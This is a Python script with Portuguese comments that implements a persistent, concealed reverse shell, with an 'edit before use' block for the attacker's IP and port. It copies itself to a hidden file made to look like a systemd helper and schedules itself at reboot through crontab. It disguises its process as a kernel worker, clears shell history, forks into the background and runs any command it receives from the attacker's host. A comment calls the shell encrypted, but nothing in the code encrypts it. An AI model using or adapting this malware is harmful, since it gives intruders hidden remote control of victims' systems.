import socket
import os
import sys
import subprocess
import time
import setproctitle

# Configurações do atacante (EDITAR ANTES DE USAR)
ATTACKER_IP = "192.168.0.100"
ATTACKER_PORT = 443

# Ocultação e persistência
def setup_persistence():
    # Cria cópia oculta em /usr/lib
    if not os.path.exists("/usr/lib/.systemd-helper"):
        os.system(f"cp {sys.argv[0]} /usr/lib/.systemd-helper")
        os.system("chmod +x /usr/lib/.systemd-helper")

    # Adiciona persistência via cron
    os.system("(crontab -l 2>/dev/null; echo '@reboot /usr/lib/.systemd-helper') | crontab -")

# Anti-debugging e ocultação
setproctitle.setproctitle("[kworker]")
os.system("unset HISTFILE; history -c")
sys.stdout = open(os.devnull, 'w')
sys.stderr = open(os.devnull, 'w')

# Daemonize
pid = os.fork()
if pid > 0:
    sys.exit(0)

# Reverse shell criptografada
def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ATTACKER_IP, ATTACKER_PORT))
            
            while True:
                command = s.recv(1024).decode().strip()
                if command == "exit":
                    s.close()
                    break
                output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
                s.sendall(output[0] or output[1] or b"No output")
        except:
            time.sleep(60)

if __name__ == "__main__":
    setup_persistence()
    connect()
